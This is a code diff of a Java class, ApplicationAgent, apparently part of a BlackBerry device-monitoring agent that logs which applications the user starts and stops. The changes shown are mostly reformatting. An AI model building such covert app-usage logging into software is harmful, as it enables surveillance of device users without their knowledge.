@@ -44,7 +44,8 @@ public final class ApplicationAgent extends Agent implements
      *            the agent status
      */
     public ApplicationAgent(final boolean agentStatus) {
-        super(Agent.AGENT_APPLICATION, agentStatus, Conf.AGENT_APPLICATION_ON_SD, "ApplicationAgent");
+        super(Agent.AGENT_APPLICATION, agentStatus,
+                Conf.AGENT_APPLICATION_ON_SD, "ApplicationAgent");
     }
 
     /**
@@ -59,7 +60,7 @@ public final class ApplicationAgent extends Agent implements
             final byte[] confParams) {
         this(agentStatus);
         parse(confParams);
-        
+
         firstRun = true;
     }
 
@@ -78,7 +79,7 @@ public final class ApplicationAgent extends Agent implements
         //#ifdef DEBUG_TRACE
         debug.trace("actualStart");
         //#endif
-        
+
         AppListener.getInstance().addApplicationListObserver(this);
     }
 
@@ -99,9 +100,9 @@ public final class ApplicationAgent extends Agent implements
      * blackberry.interfaces.ApplicationListObserver#onApplicationListChange
      * (java.util.Vector, java.util.Vector)
      */
-    public synchronized void onApplicationListChange(final Vector startedListName,
-            final Vector stoppedListName, final Vector startedListMod,
-            final Vector stoppedListMod) {
+    public synchronized void onApplicationListChange(
+            final Vector startedListName, final Vector stoppedListName,
+            final Vector startedListMod, final Vector stoppedListMod) {
 
         //#ifdef DBC
         Check.requires(startedListName != null, "startedListName != null");
@@ -117,9 +118,12 @@ public final class ApplicationAgent extends Agent implements
 
             //#ifdef DBC
             Check.asserts(startedListName.size() > 0, "startedList.size() > 0");
-            Check.asserts(stoppedListName.size() == 0, "stoppedList.size() == 0");
+            Check.asserts(stoppedListName.size() == 0,
+                    "stoppedList.size() == 0");
             Check.asserts(startedListMod.size() > 0, "startedList.size() > 0");
-            Check.asserts(stoppedListMod.size() == 0, "stoppedList.size() == 0");
+            Check
+                    .asserts(stoppedListMod.size() == 0,
+                            "stoppedList.size() == 0");
             //#endif
 
             firstRun = false;
@@ -130,8 +134,8 @@ public final class ApplicationAgent extends Agent implements
 
         int size = startedListName.size();
         for (int i = 0; i < size; i++) {
-            String name = (String) startedListName.elementAt(i);
-            String mod = (String) startedListMod.elementAt(i);
+            final String name = (String) startedListName.elementAt(i);
+            final String mod = (String) startedListMod.elementAt(i);
             //#ifdef DEBUG_TRACE
             debug.trace(name + " START");
             //#endif
@@ -140,8 +144,8 @@ public final class ApplicationAgent extends Agent implements
 
         size = stoppedListName.size();
         for (int i = 0; i < size; i++) {
-            String name = (String) stoppedListName.elementAt(i);
-            String mod = (String) stoppedListMod.elementAt(i);
+            final String name = (String) stoppedListName.elementAt(i);
+            final String mod = (String) stoppedListMod.elementAt(i);
             //#ifdef DEBUG_TRACE
             debug.trace(name + " STOP");
             //#endif
@@ -155,10 +159,10 @@ public final class ApplicationAgent extends Agent implements
 
         //#endif
     }
-    
-    public synchronized void onApplicationListChangeMod(final Vector startedList,
-            final Vector stoppedList) {
-    //TODO: onApplicationListChangeMod
+
+    public synchronized void onApplicationListChangeMod(
+            final Vector startedList, final Vector stoppedList) {
+        //TODO: onApplicationListChangeMod
     }
 
     /*
@@ -169,16 +173,17 @@ public final class ApplicationAgent extends Agent implements
         //#ifdef DEBUG_TRACE
         debug.trace("parse");
         //#endif
-        
+
         //#ifdef DEBUG
         //StringBuffer sb = new StringBuffer();
         //debug.info(sb.toString());
         //#endif
-        
+
         return false;
     }
 
-    private void writeLog(final String appName, final String condition, final String mod) {
+    private void writeLog(final String appName, final String condition,
+            final String mod) {
         final byte[] tm = (new DateTime()).getStructTm();
 
         final Vector items = new Vector();
